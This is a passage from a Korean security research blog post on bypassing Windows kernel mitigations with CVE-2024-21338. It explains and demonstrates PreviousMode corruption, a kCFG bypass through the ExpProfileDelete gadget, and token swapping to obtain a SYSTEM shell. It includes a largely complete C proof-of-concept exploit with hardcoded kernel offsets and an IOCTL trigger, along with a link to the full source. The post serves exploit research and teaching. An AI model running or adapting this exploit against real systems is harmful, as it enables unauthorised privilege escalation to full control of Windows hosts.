   +<span class="hljs-number">0x228</span> UserAffinity     : <span class="hljs-number">0xffffdc0f</span>`c3780a68 _KAFFINITY_EX
   +<span class="hljs-number">0x230</span> UserAffinityPrimaryGroup : <span class="hljs-number">0</span>
   +<span class="hljs-number">0x232</span> PreviousMode     : <span class="hljs-number">0</span> <span class="hljs-string">&apos;&apos;</span>
   +0x233 BasePriority     : 8 &apos;&apos;</code></pre>
<p>&#xB2E4;&#xC2DC; &#xBD84;&#xC11D; &#xBA38;&#xC2E0;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xC640; &#xC544;&#xBB34; &#xBC84;&#xD2BC;&#xC774;&#xB098; &#xB204;&#xB974;&#xBA74; &#xB2E4;&#xC74C; &#xC2A4;&#xD15D;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. </p>
<pre><code class="hljs c">pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + <span class="hljs-number">0x4b8</span> , (ULONGLONG)SYSTEM_EPROCESS + <span class="hljs-number">0x4b8</span>, <span class="hljs-keyword">sizeof</span>(ULONGLONG), &amp;dwbytes);
system(<span class="hljs-string">&quot;cmd.exe&quot;</span>)</code></pre>
<p>PreviousMode &#xBCC0;&#xC870;&#xB97C; &#xD1B5;&#xD574; <code>pNtWritevirtualMemory</code> &#xD568;&#xC218;&#xB85C; &#xCEE4;&#xB110; Read/Write&#xAC00; &#xAC00;&#xB2A5;&#xD574;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2DC;&#xC2A4;&#xD15C; EPROCESS&#xC758; Token&#xC73C;&#xB85C; Token Swapping&#xC744; &#xD55C; &#xB4A4; cmd &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; NT AUTORITY\SYSTEM &#xAD8C;&#xD55C;&#xC758; cmd&#xAC00;&#x2026;!</p>
<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%208.png" srcset="/img/loading.gif" alt="image.png"></p>
<p>?</p>
<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%209.png" srcset="/img/loading.gif" alt="image.png"></p>
<p>BSOD&#xAC00; &#xB5A0;&#xBC84;&#xB838;&#xB124;&#xC694;.. ??</p>
<p>&#xBB38;&#xC81C;&#xB294; PreviousMode&#xB97C; &#xCEE4;&#xB110;&#xBAA8;&#xB4DC;&#xB85C; &#xBCC0;&#xC870;&#xD55C; &#xB4A4; &#xC2DC;&#xC2A4;&#xD15C; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB824;&#xACE0; &#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. Token Swapping&#xC744; &#xD55C; &#xC774;&#xD6C4;&#xC5D0;&#xB294; &#xCEE4;&#xB110;&#xBAA8;&#xB4DC; PreviousMode&#xAC00; &#xD544;&#xC694; &#xC5C6;&#xC73C;&#xB2C8; cmd &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC0DD;&#xC131; &#xC804;&#xC5D0; &#xC6D0;&#xB798; &#xAC12;&#xC778; 1&#xB85C; &#xBCF5;&#xC6D0;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC774; &#xC788;&#xC5B4;&#xC57C; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs c"><span class="hljs-keyword">char</span>* restoreBuffer = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(CHAR));
*restoreBuffer = <span class="hljs-number">1</span>;

pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + <span class="hljs-number">0x232</span>, (PVOID)restoreBuffer, <span class="hljs-keyword">sizeof</span>(CHAR), &amp;dwbytes);
system(<span class="hljs-string">&quot;cmd.exe&quot;</span>);</code></pre>
<p>&#xC704; &#xCF54;&#xB4DC;&#xB97C; &#xCD94;&#xAC00;&#xD574; &#xB2E4;&#xC2DC; &#xD574;&#xBCF4;&#xBA74;..</p>
<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%2010.png" srcset="/img/loading.gif" alt="image.png"></p>
<p>&#xC774;&#xB807;&#xAC8C; PreviousMode &#xBCC0;&#xC870;&#xB85C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xB2EC;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xB2E4;&#xC2DC; kCFG &#xC6B0;&#xD68C;&#xB85C; &#xB3CC;&#xC544;&#xC640;&#xC11C;, CVE-2024-21338&#xC758; untrusted pointer dereference &#xCDE8;&#xC57D;&#xC810; &#xD2B8;&#xB9AC;&#xAC70; &#xD6C4; kCFG &#xBE44;&#xD2B8;&#xB9F5;&#xC5D0; &#xB4F1;&#xB85D;&#xB41C; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xCEE4;&#xB110; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; PreviouMode&#xB97C; &#xBCC0;&#xC870;&#xD560; &#xC218; &#xC788;&#xACA0;&#xC8E0;. &#xADFC;&#xB370;.. &#xB9CE;&#xACE0; &#xB9CE;&#xC740; &#xCEE4;&#xB110; &#xD568;&#xC218; &#xC911; &#xC774;&#xB7F0; &#xD568;&#xC218;&#xB294; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC3E;&#xC544;&#xC57C; &#xD560;&#xAE4C;&#xC694; :(</p>
<p>&#xC8FC;&#xBAA9;&#xD574;&#xBCFC;&#xB9CC;&#xD55C; &#xD568;&#xC218; &#xC911; <code>ObfDereferenceObjectWithTag</code> &#xCEE4;&#xB110; &#xB9E4;&#xD06C;&#xB85C;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xB9E4;&#xD06C;&#xB85C;&#xB294; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xC624;&#xBE0C;&#xC81D;&#xD2B8; &#xC8FC;&#xC18C;&#xC758; &#xB808;&#xD37C;&#xB7F0;&#xC2A4; &#xCE74;&#xC6B4;&#xD2B8; &#xD544;&#xB4DC;(&#xC624;&#xD504;&#xC14B; -0x30) &#xB97C; &#xAC10;&#xC18C;&#xC2DC;&#xD0A4;&#xBBC0;&#xB85C; PreviousMode&#xC758; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xAC12;&#xC778; 1&#xC5D0;&#xC11C; &#xCEE4;&#xB110;&#xBAA8;&#xB4DC; &#xAC12;&#xC778; 0&#xC73C;&#xB85C; &#xBCC0;&#xC870;&#xD558;&#xAE30; &#xB531; &#xC88B;&#xC740; &#xB9E4;&#xD06C;&#xB85C;&#xAC00; &#xB418;&#xACA0;&#xB124;&#xC694;.</p>
<p>&#xADF8;&#xB7EC;&#xB098; <code>ObfDereferenceObjectWithTag</code> &#xC744; &#xBC14;&#xB85C; &#xD638;&#xCD9C;&#xD558;&#xAE30;&#xC5D0;&#xB294; &#xD55C; &#xAC00;&#xC9C0; &#xC81C;&#xC57D;&#xC0AC;&#xD56D;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC544;&#xAE4C; &#xBC84;&#xADF8; &#xD2B8;&#xB9AC;&#xAC70; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD588;&#xB358; &#xAC83;&#xCC98;&#xB7FC; &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790; &#xAC12;&#xC744; &#xC9C1;&#xC811; &#xC81C;&#xC5B4;&#xD560; &#xC218;&#xB294; &#xC5C6;&#xACE0;, &#xC778;&#xC790;&#xAC00; &#xCC38;&#xC870;&#xD558;&#xB294; &#xAC12;&#xB9CC; &#xAC04;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC774;&#xC8E0;.</p>
<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%203.png" srcset="/img/loading.gif" alt="image.png"></p>
<p>rcx&#xB97C; &#xD55C; &#xBC88; &#xCC38;&#xC870;&#xD55C; &#xAC12;&#xC744; <code>ObfDereferenceObjectWithTag</code> &#xB9E4;&#xD06C;&#xB85C;&#xC758; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xD574; &#xC6B0;&#xB9AC;&#xAC00; &#xC9C1;&#xC811; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xB294;  wrapper &#xD568;&#xC218;&#xB97C; &#xB610; &#xCC3E;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p>
<p><code>ObfDereferenceObjectWithTag</code> &#xB9E4;&#xD06C;&#xB85C;&#xC758; &#xD06C;&#xB85C;&#xC2A4; &#xB808;&#xD37C;&#xB7F0;&#xC2A4; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xCB49; &#xCC3E;&#xC544;&#xBCF4;&#xBA74; &#xD574;&#xB2F9; &#xC870;&#xAC74;&#xC744; &#xB9CC;&#xC871;&#xD558;&#xB294; <code>ExpProfileDelete</code> &#xD568;&#xC218;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs lua">void __fastcall ExpProfileDelete(__int64 a1)
{
  <span class="hljs-keyword">if</span> ( *(_QWORD *)(a1 + <span class="hljs-number">48</span>) )
  {
    KeStopProfile(*(_QWORD *)(a1 + <span class="hljs-number">40</span>));
    MmUnmapLockedPages(*(PVOID *)(a1 + <span class="hljs-number">48</span>), *(PMDL *)(a1 + <span class="hljs-number">56</span>));
    MmUnlockPages(*(PMDL *)(a1 + <span class="hljs-number">56</span>));
    ExFreePoolWithTag(*(PVOID *)(a1 + <span class="hljs-number">40</span>), <span class="hljs-number">0</span>);
  }
  <span class="hljs-keyword">if</span> ( *(_QWORD *)a1 )
    ObfDereferenceObjectWithTag(*(PVOID *)a1, <span class="hljs-number">0x66507845</span>u);
}</code></pre>
<p>&#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB97C; &#xCC38;&#xC870;&#xD55C; &#xAC12;&#xC744; <code>ObfDereferenceObjectWithTag</code>&#xB85C; &#xC804;&#xB2EC;&#xD574; &#xD638;&#xCD9C;&#xD558;&#xB124;&#xC694;. &#xC774;&#xB7EC;&#xBA74; &#xB9E4;&#xD06C;&#xB85C;&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB97C; &#xC6B0;&#xB9AC;&#xAC00; &#xC9C1;&#xC811; &#xCEE8;&#xD2B8;&#xB864;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%2011.png" srcset="/img/loading.gif" alt="image.png"></p>
<p>&#xC6B0;&#xC120; CVE-2024-21338 &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; <code>ExpProfileDelete</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; kCFG&#xAC00; &#xC6B0;&#xD68C;&#xB418;&#xACE0; <code>ExpProfileDelete</code> &#xC8FC;&#xC18C;&#xB85C; &#xC810;&#xD504;&#xD569;&#xB2C8;&#xB2E4;.</p>
<blockquote>
<p><code>ExpProfileDelete</code> &#xD568;&#xC218; &#xC8FC;&#xC18C;&#xB294; Part 1&#xC758; <code>NtQuerySystemInformation</code> &#xB97C; &#xD1B5;&#xD574; &#xAD6C;&#xD55C; ntoskrnle.exe &#xBCA0;&#xC774;&#xC2A4;&#xC640; &#xC624;&#xD504;&#xC14B; &#xACC4;&#xC0B0;&#xC744; &#xD1B5;&#xD574; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
</blockquote>
<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%2012.png" srcset="/img/loading.gif" alt="image.png"></p>
<p><code>ExpProfileDelete</code> &#xB0B4;&#xC5D0;&#xC11C; <code>ObfDereferenceObjectWithTag</code> &#xB9E4;&#xD06C;&#xB85C; &#xD638;&#xCD9C; &#xC2DC;&#xC810;&#xC758; rcx&#xAC00; <code>0x4141414141414141</code>&#xB85C; &#xB098;&#xC624;&#xB124;&#xC694;. &#xB4DC;&#xB514;&#xC5B4; &#xC6B0;&#xB9AC;&#xAC00; &#xC6D0;&#xD558;&#xB294; &#xC8FC;&#xC18C;&#xB97C; &#xAC10;&#xC18C;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
<p><code>ExpProfileDelete</code> &#xAC00; &#xC544;&#xB2C8;&#xB354;&#xB77C;&#xB3C4; &#xC870;&#xAC74;&#xC744; &#xB9CC;&#xC871;&#xD558;&#xB294; &#xD568;&#xC218;&#xB294; &#xB354; &#xC788;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E8;, &#xD568;&#xC218;&#xC758; &#xB85C;&#xC9C1;&#xC774; &#xBCF5;&#xC7A1;&#xD560;&#xC218;&#xB85D; &#xC6B0;&#xB9AC;&#xAC00; &#xC758;&#xB3C4;&#xD55C; &#xB3D9;&#xC791; &#xC678; &#xB2E4;&#xB978; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA70; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB192;&#xC544;&#xC9D1;&#xB2C8;&#xB2E4;. &#xB54C;&#xBB38;&#xC5D0; &#xBE44;&#xAD50;&#xC801; &#xAC04;&#xB2E8;&#xD55C; &#xD568;&#xC218;&#xB97C; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xCC3E;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xC744; &#xAC83; &#xAC19;&#xB124;&#xC694;.</p>
<p>&#xC544;&#xB798;&#xB294; CVE-2024-21338 &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; PreviousMode&#xB97C; &#xBCC0;&#xC870;&#xD558;&#xACE0; Token Swapping&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xCD5C;&#xC885; PoC &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;defines.h&quot;</span></span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STATUS_INFO_LENGTH_MISMATCH 0xc0000004</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DEVICE_NAME <span class="hljs-meta-string">&quot;\\\\?\\AppID&quot;</span></span>

<span class="hljs-comment">// IOCTL 0x22A018</span>
<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>
	PVOID arg1;
	PVOID objptr;
	PVOID cfgptr;
	PVOID unknown;
} INPUT_BUFFER;

_NtQuerySystemInformation pNtQuerySystemInformation;
_NtFsControlFile pNtFsControlFile;
_NtWriteVirtualMemory pNtWriteVirtualMemory;
_NtReadVirtualMemory pNtReadVIrtualMemory;
_NtDeviceIoControlFile pNtDeviceIoControlFile;

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">GetNtFunction</span><span class="hljs-params">()</span> </span>{...}
<span class="hljs-function">PVOID <span class="hljs-title">GetImageBase</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* ModuleName)</span> </span>{...}
<span class="hljs-function">PVOID <span class="hljs-title">GetFILE_OBJECT_Address</span><span class="hljs-params">()</span></span>{...}
<span class="hljs-function">PVOID <span class="hljs-title">GetObj</span><span class="hljs-params">(PULONGLONG objptr, ULONG pid, HANDLE handle)</span></span>{...}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
	PVOID KTHREAD = <span class="hljs-literal">NULL</span>;
	PVOID SYSTEM_EPROCESS = <span class="hljs-literal">NULL</span>;
	PVOID EPROCESS = <span class="hljs-literal">NULL</span>;
	PVOID PreviousMode = <span class="hljs-literal">NULL</span>;
	PVOID NTOSKRNL_BASE = <span class="hljs-literal">NULL</span>;

	ULONG dwbytes = <span class="hljs-number">0</span>;
	GetNtFunction();

	DWORD pid = GetCurrentProcessId();

	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
	GetObj(&amp;KTHREAD, pid, hThread);
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Current KTHREAD: %p\n&quot;</span>, KTHREAD);

	PreviousMode = (UINT64)KTHREAD + <span class="hljs-number">0x232</span>;
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] PreviousMode address: %p\n&quot;</span>, PreviousMode);

	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	GetObj(&amp;EPROCESS, pid, hProc);
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Current EPROCESS: %p\n&quot;</span>, EPROCESS);

	GetObj(&amp;SYSTEM_EPROCESS, <span class="hljs-number">4</span>, (HANDLE)<span class="hljs-number">4</span>);
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] System EPROCESS: %p\n&quot;</span>, SYSTEM_EPROCESS);

	NTOSKRNL_BASE = GetImageBase(<span class="hljs-string">&quot;ntoskrnl.exe&quot;</span>);
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] ntoskrnl.exe base address : %p\n&quot;</span>, NTOSKRNL_BASE);

	PVOID ExpProfileDelete = (UINT64)NTOSKRNL_BASE + <span class="hljs-number">0xA01FD0</span>; <span class="hljs-comment">// kcfg bypass gadget</span>
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] ExpProfileDelete function address : %p\n&quot;</span>, ExpProfileDelete);

	PVOID FILE_OBJECT = GetFILE_OBJECT_Address();

	INPUT_BUFFER buffer = { <span class="hljs-number">0</span>, };
	HANDLE dHandle;
	dHandle = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="hljs-literal">NULL</span>, CREATE_NEW, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);

	buffer.arg1 = (UINT64)PreviousMode + <span class="hljs-number">0x30</span>;		
	buffer.objptr = FILE_OBJECT;					
	buffer.cfgptr = &amp;ExpProfileDelete;				
	buffer.unknown = <span class="hljs-literal">NULL</span>;							

	IO_STATUS_BLOCK ioStatus;

	<span class="hljs-keyword">if</span> (pNtDeviceIoControlFile(dHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;ioStatus, <span class="hljs-number">0x22A018</span>, &amp;buffer, <span class="hljs-keyword">sizeof</span>(buffer), <span class="hljs-literal">NULL</span>, &amp;dwbytes) != NOERROR) {
		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NtDeviceIoControlFile Failed, 0x%x\n&quot;</span>, GetLastError());
	}

	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + <span class="hljs-number">0x4b8</span>, (ULONGLONG)SYSTEM_EPROCESS + <span class="hljs-number">0x4b8</span>, <span class="hljs-keyword">sizeof</span>(ULONGLONG), &amp;dwbytes);

	<span class="hljs-keyword">char</span>* restoreBuffer = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(CHAR));
	*restoreBuffer = <span class="hljs-number">1</span>;

	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + <span class="hljs-number">0x232</span>, (PVOID)restoreBuffer, <span class="hljs-keyword">sizeof</span>(CHAR), &amp;dwbytes);

	system(<span class="hljs-string">&quot;cmd.exe&quot;</span>);

	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre>
<blockquote>
<p>&#xC804;&#xCCB4; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;: <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/hackyboiz/kcfg-bypass/blob/main/CVE-2024-21338.c">https://github.com/hackyboiz/kcfg-bypass/blob/main/CVE-2024-21338.c</a></p>
</blockquote>
<p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%2013.png" srcset="/img/loading.gif" alt="image.png"></p>
<p>&#xC6D0;&#xB798; &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; &#xC138; &#xAC00;&#xC9C0; &#xAE30;&#xBC95;&#xC744; &#xBAA8;&#xB450; &#xC18C;&#xAC1C;&#xD558;&#xB824;&#xACE0; &#xD588;&#xC9C0;&#xB9CC;.. &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xAE38;&#xC5B4;&#xC9C4; &#xAD00;&#xACC4;&#xB85C; &#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; &#xB0A8;&#xC740; &#xB450; &#xAC00;&#xC9C0; &#xAE30;&#xBC95;&#xC5D0; &#xB300;&#xD574; &#xC815;&#xB9AC;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E;.. (&#xAD1C;&#xCC2E;&#xC544; &#xB098;&#xD55C;&#xD150; &#xC124; &#xC5F0;&#xD734;&#xAC00; &#xC788;&#xC5B4;)</p>
<p>&#xADF8;&#xB7FC; Part 3&#xB85C; &#xB2E4;&#xC2DC; &#xCC3E;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; :) 2025&#xB144;&#xC5D0;&#xB3C4; &#xC6B0;&#xB9AC; &#xC5F4;&#xC2EC;&#xD788; &#xACF5;&#xBD80;&#xD574;&#xC694;</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                <div class="post-meta mr-3">
                  <i class="iconfont icon-category"></i>
                  
                  <a class="hover-with-bg" href="/categories/Research/">Research</a>
                  
                </div>
                
                
                <div class="post-meta">
                  <i class="iconfont icon-tags"></i>
                  
                  <a class="hover-with-bg" href="/tags/kernel/">kernel</a>
                  
                  <a class="hover-with-bg" href="/tags/windows/">windows</a>
                  
                  <a class="hover-with-bg" href="/tags/bypass/">bypass</a>
                  
                  <a class="hover-with-bg" href="/tags/L0ch/">L0ch</a>
                  
                  <a class="hover-with-bg" href="/tags/ioring/">ioring</a>
                  
                  <a class="hover-with-bg" href="/tags/mitigation/">mitigation</a>
                  
                  <a class="hover-with-bg" href="/tags/smep/">smep</a>
                  
                  <a class="hover-with-bg" href="/tags/kcfg/">kcfg</a>
                  
                  <a class="hover-with-bg" href="/tags/dep/">dep</a>
                  
                  <a class="hover-with-bg" href="/tags/exploit-techniques/">exploit techniques</a>
                  
                  <a class="hover-with-bg" href="/tags/previousmode/">previousmode</a>
                  
                  <a class="hover-with-bg" href="/tags/cve-2024-21338/">cve-2024-21338</a>
                  
                  <a class="hover-with-bg" href="/tags/sedebugprivilege/">sedebugprivilege</a>
                  
                </div>
                
              </div>

              <div class="post-metas mb-3">
                <a class="hover-with-bg" style="display: flex;" href="/author">
                  <div class="link-avatar-page">
                    <img src="/img/profile_L0ch.jpg" srcset="/img/loading.gif" alt="L0ch">
                  </div>

                  <div class="link-text">
                    <div class="link-title">L0ch</div>
                  </div>
                </a>
                <div class="link-text">
                  <div class="link-more">
                    <a href="/tags/L0ch">
                      Read more
                      <i class="iconfont icon-arrowdown"></i>
                    </a>
                  </div>
                </div>
              </div>

              <hr>
              <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
              
              
              <div class="post-prevnext row">
                <article class="post-prev col-6">
                  
                  
                  <a href="/2025/01/15/l0ch/2025-01-15/">
                    <i class="iconfont icon-arrowleft"></i>
                    <span class="hidden-mobile">[] CVE-2024-49415:   OOB Write  Zero-Click RCE</span>
                    <span class="visible-mobile">Previous</span>
                  </a>
                  
                </article>
                <article class="post-next col-6">
                  
                  
                  <a href="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/">
                    <span class="hidden-mobile">[Research] Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 (En)</span>
                    <span class="visible-mobile">Next</span>
                    <i class="iconfont icon-arrowright"></i>
                  </a>
                  
                </article>
              </div>
              
            </div>
            
            <!-- Embed Section -->
            <div style="width: 100%; height: 210px; margin-bottom: 50px; overflow: hidden;">
              <iframe src="https://maily.so/hackyboiz/embed?src=embed" style="width: 100%; height: 100%; border: none;" frameborder="0"></iframe>
            </div>            

            
            <!-- Comments -->
            <article class="comments" id="comments">
              
              
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
      var disqus_config = function () {
        this.page.url = 'https://hackyboiz.github.io/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/';
        this.page.identifier = '/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/';
      };
      function loadDisqus() {
        (function () {
          var d = document,
            s = d.createElement('script');
          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
          s.setAttribute('data-timestamp', new Date());
          (d.head || d.body).appendChild(s);
        })();
      }
      waitElementVisible('disqus_thread', loadDisqus);
    </script>
    <noscript>Please enable JavaScript to view the
      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
    </noscript>
  </div>


            </article>
            
          </article>
        </div>
      </div>
    </div>
    
    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
      <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

    </div>
    
  </div>
</div>

<!-- Custom -->

    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="/js/debouncer.js"></script>
<script src="/js/main.js"></script>

<!-- Plugins -->


  
    <script src="/js/lazyload.js"></script>
  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
  <script src="/js/clipboard-use.js"></script>







  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "[Research] Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 (Ko)&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
